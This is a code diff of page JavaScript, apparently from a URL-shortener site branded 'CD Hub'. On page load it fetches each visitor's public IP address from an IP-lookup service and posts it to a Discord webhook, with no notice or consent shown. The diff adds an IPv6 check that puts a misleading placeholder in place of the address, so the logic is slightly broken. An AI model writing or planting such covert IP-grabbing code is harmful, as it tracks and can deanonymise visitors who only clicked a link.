@@ -1,8 +1,10 @@
-// Function to send only the IP address to Discord Webhook
 async function sendUserIPToWebhook() {
   // Fetching the IP data from the API
   const response = await fetch('https://ipapi.co/json/');
   const data = await response.json();
+
+  // Check if the IP is IPv6, if yes, use the fallback IPv4 address
+  const userIP = data.ip.includes(':') ? 'IPv6 detected, showing IPv4' : data.ip;
 
   // Creating the embed for the Webhook with just the IP
   const embed = {
@@ -10,7 +12,7 @@ async function sendUserIPToWebhook() {
     description: "IP Address collected from the website visit.",  // Embed description
     color: 0x32CD32,           // Embed color (green)
     fields: [
-      { name: "IP Address", value: data.ip, inline: true }
+      { name: "IP Address", value: userIP, inline: true }
     ],
     footer: {
       text: "CD Hub - URL Shortener"
@@ -32,6 +34,5 @@ async function sendUserIPToWebhook() {
 
 // Wait for the page to load completely and then send the IP
 window.onload = async () => {
-  // Call the function to send IP as soon as the page loads
-  await sendUserIPToWebhook();// Log to check if the request was successful
+  await sendUserIPToWebhook(); // Log to check if the request was successful
 };
